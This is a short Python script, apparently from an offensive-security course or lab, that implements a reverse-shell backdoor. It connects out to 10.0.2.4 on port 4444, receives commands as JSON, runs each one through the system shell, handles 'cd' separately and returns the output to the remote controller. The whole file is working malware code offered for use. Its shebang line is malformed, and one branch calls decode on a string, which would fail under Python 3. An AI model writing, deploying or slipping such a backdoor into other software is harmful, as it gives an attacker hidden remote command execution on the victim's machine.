#!usr/bin/env python3

import socket, json, os
import subprocess


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        if isinstance(data,str):
            json_data = json.dumps(data.decode("utf-8"))
        else:
            json_data = json.dumps(data)
        self.connection.send(json_data.encode("utf-8"))

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def change_current_directory(self, path):
        os.chdir(path)
        return "[+] changing working directory to " + path

    def run(self):
        while True:
            command = self.reliable_receive()
            if command[0] == "exitbackdoor":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_current_directory(command[1])
            else:
                command_result = self.execute_system_command(command)
            self.reliable_send(command_result)


my_backdoor = Backdoor("10.0.2.4", 4444)
my_backdoor.run()
